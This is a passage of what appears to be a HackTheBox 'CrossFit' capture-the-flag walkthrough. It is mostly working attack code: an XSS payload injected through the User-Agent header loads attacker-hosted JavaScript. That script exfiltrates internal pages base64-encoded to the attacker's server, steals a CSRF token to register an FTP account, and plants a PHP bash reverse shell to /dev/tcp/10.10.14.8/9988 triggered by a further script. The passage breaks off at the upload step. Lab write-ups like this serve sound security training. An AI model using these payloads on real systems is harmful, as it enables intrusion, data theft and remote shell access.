<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.10.14.8/luci.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>burp request:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /blog-single.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: gym-club.crossfit.htb</span><br><span class="line"></span><br><span class="line">User-Agent: &lt;script src=<span class="string">&quot;http://10.10.14.8/luci.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 93</span><br><span class="line"></span><br><span class="line">Origin: http://gym-club.crossfit.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://gym-club.crossfit.htb/blog-single.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=lucifer11&amp;email=1185151867%40qq.com&amp;phone=17746608760&amp;message=%3Cscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>Let’s send the request and check our python server.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.10.208 - - [28/Nov/2020 08:45:54] <span class="string">&quot;GET /luci.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.208 - - [28/Nov/2020 08:45:55] code 404, message File not found</span><br><span class="line">10.10.10.208 - - [28/Nov/2020 08:45:55] <span class="string">&quot;GET /PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RlRQIEhvc3RpbmcgLSBBY2NvdW50IE1hbmFnZW1lbnQ8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYWxwaGEvY3NzL2Jvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+Cgo8YnI+CjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIgbWFyZ2luLXRiIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icHVsbC1sZWZ0Ij4KICAgICAgICAgICAgICAgIDxoMj5GVFAgSG9zdGluZyAtIEFjY291bnQgTWFuYWdlbWVudDwvaDI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwdWxsLXJpZ2h0Ij4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiIGhyZWY9Imh0dHA6Ly9mdHAuY3Jvc3NmaXQuaHRiL2FjY291bnRzL2NyZWF0ZSI+IENyZWF0ZSBOZXcgQWNjb3VudDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICAKICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQiPgogICAgICAgIDx0cj4KICAgICAgICAgICAgPHRoPk5vPC90aD4KICAgICAgICAgICAgPHRoPlVzZXJuYW1lPC90aD4KICAgICAgICAgICAgPHRoPkNyZWF0aW9uIERhdGU8L3RoPgogICAgICAgICAgICA8dGggd2lkdGg9IjI4MHB4Ij5BY3Rpb248L3RoPgogICAgICAgIDwvdHI+CgogICAgICAgIAogICAgPC90YWJsZT4KCiAgICAKCjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg== HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>It give us a base64 string.</p>
<p>Let’s decode this and see what inside.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;title&gt;FTP Hosting - Account Management&lt;/title&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> href=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;row&quot;</span>&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;col-lg-12 margin-tb&quot;</span>&gt;</span><br><span class="line">            &lt;div class=<span class="string">&quot;pull-left&quot;</span>&gt;</span><br><span class="line">                &lt;h2&gt;FTP Hosting - Account Management&lt;/h2&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=<span class="string">&quot;pull-right&quot;</span>&gt;</span><br><span class="line">                &lt;a class=<span class="string">&quot;btn btn-success&quot;</span> href=<span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>&gt; Create New Account&lt;/a&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &lt;table class=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span><br><span class="line">        &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">            &lt;th&gt;No&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Username&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Creation Date&lt;/th&gt;</span><br><span class="line">            &lt;th width=<span class="string">&quot;280px&quot;</span>&gt;Action&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &lt;/table&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>It’s a html code for ftp.crossfit.htb wepsite.</p>
<p>If you not conform Let’s open this in browser.</p>
<p>It’s a FTP Hosting - Account Management page.</p>
<p>Let’s create new user.</p>
<p>But first Let’s check what is the url when we click on create new account.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ftp.crossfit.htb/accounts/create</span><br></pre></td></tr></table></figure>

<p>let’s add this in our luci.js and check how’s the page look on ftp.crossfit.htb&#x2F;accounts&#x2F;create</p>
<p>luci.js</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">myhttpserver = <span class="string">&#x27;http://10.10.14.8/&#x27;</span></span><br><span class="line">targeturl = <span class="string">&#x27;http://ftp.crossfit.htb/accounts/create&#x27;</span></span><br><span class="line"></span><br><span class="line">req = new XMLHttpRequest;</span><br><span class="line">req.onreadystatechange = <span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.readyState == 4) &#123;</span><br><span class="line">            req2 = new XMLHttpRequest;</span><br><span class="line">            req2.open(<span class="string">&#x27;GET&#x27;</span>, myhttpserver + btoa(this.responseText),<span class="literal">false</span>);</span><br><span class="line">            req2.send();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">req.open(<span class="string">&#x27;GET&#x27;</span>, targeturl, <span class="literal">false</span>);</span><br><span class="line">req.send();</span><br></pre></td></tr></table></figure>

<p>Let’s send the request again in burp.</p>
<p>And we got the response.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.10.208 - - [28/Nov/2020 08:55:42] <span class="string">&quot;GET /luci.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.208 - - [28/Nov/2020 08:55:42] code 404, message File not found</span><br><span class="line">10.10.10.208 - - [28/Nov/2020 08:55:42] <span class="string">&quot;GET /PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RlRQIEhvc3RpbmcgLSBBY2NvdW50IE1hbmFnZW1lbnQ8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYWxwaGEvY3NzL2Jvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+Cgo8YnI+CjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAKPGRpdiBjbGFzcz0icm93Ij4KICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiBtYXJnaW4tdGIiPgogICAgICAgIDxkaXYgY2xhc3M9InB1bGwtbGVmdCI+CiAgICAgICAgICAgIDxoMj5BZGQgTmV3IEFjY291bnQ8L2gyPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InB1bGwtcmlnaHQiPgogICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBocmVmPSJodHRwOi8vZnRwLmNyb3NzZml0Lmh0Yi9hY2NvdW50cyI+IEJhY2s8L2E+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CgoKPGZvcm0gYWN0aW9uPSJodHRwOi8vZnRwLmNyb3NzZml0Lmh0Yi9hY2NvdW50cyIgbWV0aG9kPSJQT1NUIj4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Il90b2tlbiIgdmFsdWU9IkJobURaQWlMN0JDc01kbnRvOXIwTnlyVW5yTldQcFhZRE1HbEVtQ08iPgogICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS0xMiBjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgIDxzdHJvbmc+VXNlcm5hbWU6PC9zdHJvbmc+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHBsYWNlaG9sZGVyPSJVc2VybmFtZSI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb2wtc20tMTIgY29sLW1kLTEyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICA8c3Ryb25nPlBhc3N3b3JkOjwvc3Ryb25nPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTEyIGNvbC1tZC0xMiB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U3VibWl0PC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCjwvZm9ybT4KCjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg== HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>Again decode it and open in browser.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;title&gt;FTP Hosting - Account Management&lt;/title&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> href=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line">&lt;div class=<span class="string">&quot;row&quot;</span>&gt;</span><br><span class="line">    &lt;div class=<span class="string">&quot;col-lg-12 margin-tb&quot;</span>&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;pull-left&quot;</span>&gt;</span><br><span class="line">            &lt;h2&gt;Add New Account&lt;/h2&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;pull-right&quot;</span>&gt;</span><br><span class="line">            &lt;a class=<span class="string">&quot;btn btn-primary&quot;</span> href=<span class="string">&quot;http://ftp.crossfit.htb/accounts&quot;</span>&gt; Back&lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;http://ftp.crossfit.htb/accounts&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;_token&quot;</span> value=<span class="string">&quot;BhmDZAiL7BCsMdnto9r0NyrUnrNWPpXYDMGlEmCO&quot;</span>&gt;</span><br><span class="line">     &lt;div class=<span class="string">&quot;row&quot;</span>&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12&quot;</span>&gt;</span><br><span class="line">            &lt;div class=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;strong&gt;Username:&lt;/strong&gt;</span><br><span class="line">                &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> class=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12&quot;</span>&gt;</span><br><span class="line">            &lt;div class=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;strong&gt;Password:&lt;/strong&gt;</span><br><span class="line">                &lt;input <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pass&quot;</span> class=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12 text-center&quot;</span>&gt;</span><br><span class="line">                &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> class=<span class="string">&quot;btn btn-primary&quot;</span>&gt;Submit&lt;/button&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>There is two field username and password.</p>
<p>But the tricky part is if you see the source code there is a hidden value called _token which value dynamically change so if we create a payload to register user we need to grep the _token value from web page.</p>
<p>After some hit and try create a payload to register user.</p>
<p>createuser.js</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">myhttpserver = <span class="string">&#x27;http://10.10.14.8&#x27;</span></span><br><span class="line">targeturl = <span class="string">&#x27;http://ftp.crossfit.htb/accounts/create&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;luci&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;lucifer11&#x27;</span></span><br><span class="line"></span><br><span class="line">req = new XMLHttpRequest;</span><br><span class="line">req.withCredentials = <span class="literal">true</span>;</span><br><span class="line">req.onreadystatechange = <span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.readyState == 4) &#123;</span><br><span class="line">        req2 = new XMLHttpRequest;</span><br><span class="line">        req2.open(<span class="string">&#x27;GET&#x27;</span>, myhttpserver + btoa(this.responseText), <span class="literal">false</span>);</span><br><span class="line">        req2.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">req.open(<span class="string">&#x27;GET&#x27;</span>, targeturl, <span class="literal">false</span>);</span><br><span class="line">req.send();</span><br><span class="line"></span><br><span class="line">regx = /token<span class="string">&quot; value=&quot;</span>(.*)<span class="string">&quot;/g;</span></span><br><span class="line"><span class="string">token = regx.exec(req.responseText)[1];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">var params = &#x27;_token=&#x27; + token + &#x27;&amp;username=&#x27; + username + &#x27;&amp;pass=&#x27; + password + &#x27;&amp;submit=submit&#x27;</span></span><br><span class="line"><span class="string">req.open(&#x27;POST&#x27;, &quot;</span>http://ftp.crossfit.htb/accounts<span class="string">&quot;, false);</span></span><br><span class="line"><span class="string">req.setRequestHeader(&#x27;Content-type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);</span></span><br><span class="line"><span class="string">req.send(params);</span></span><br></pre></td></tr></table></figure>

<p>Now send the req in burp with this createuser.js file like this.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.10.14.8/createuser.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /blog-single.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: gym-club.crossfit.htb</span><br><span class="line"></span><br><span class="line">User-Agent: &lt;script src=<span class="string">&quot;http://10.10.14.8/createuser.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 93</span><br><span class="line"></span><br><span class="line">Origin: http://gym-club.crossfit.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://gym-club.crossfit.htb/blog-single.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=lucifer11&amp;email=1185151867%40qq.com&amp;phone=17746608760&amp;message=%3Cscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>
<p>Let’s check the python listner.</p>
<p>and receive the response:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.208 - - [28/Nov/2020 09:05:09] <span class="string">&quot;GET /createuser.js HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>And i use lftp to connect with ftp.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># lftp</span></span><br><span class="line">lftp :~&gt; <span class="built_in">set</span> ftp:ssl-force <span class="literal">true</span></span><br><span class="line">lftp :~&gt; connect 10.10.10.208</span><br><span class="line">lftp 10.10.10.208:~&gt; <span class="built_in">set</span> ssl:verify-certificate no </span><br><span class="line">lftp 10.10.10.208:~&gt; login luci</span><br><span class="line">密码: </span><br><span class="line">lftp luci@10.10.10.208:~&gt; <span class="built_in">ls</span></span><br><span class="line">drwxrwxr-x    2 33       1002         4096 Sep 21 09:45 development-test</span><br><span class="line">drwxr-xr-x   13 0        0            4096 May 07  2020 ftp</span><br><span class="line">drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 01  2020 html</span><br><span class="line">lftp luci@10.10.10.208:/&gt;</span><br></pre></td></tr></table></figure>

<p>We find another sub-domain called: development-test.crossfit.htb</p>
<p>Let’s add this in our &#x2F;etc&#x2F;hosts file.</p>
<p>If you closely see that we have read and write access of development-test directory.</p>
<p>So that mean we can upload a php reverse shell and execute it with our rev.js file.</p>
<h3 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1"></a>step 1</h3><p>Create a file called rev.php.</p>
<p>rev.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.8/9988 0&gt;&amp;1&#x27;&quot;</span>) ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2"></a>step 2</h3><p>Create another file called rev.js that will execute our rev.php.</p>
<p>rev.js</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">req = new XMLHttpRequest;</span><br><span class="line">req.open(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&quot;http://development-test.crossfit.htb/rev.php&quot;</span>);</span><br><span class="line">req.send();</span><br></pre></td></tr></table></figure>

<h3 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h3><p>Start you python server on the same directory were all files exist and netcat Listener.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">createuser.js  luci.js  rev.js  rev.php</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvp 9988</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9988</span><br><span class="line">Ncat: Listening on 0.0.0.0:9988</span><br></pre></td></tr></table></figure>

<h3 id="step-4"><a href="#step-4" class="headerlink" title="step 4"></a>step 4</h3><p>upload the rev.php in ftp development-test directory.</p>
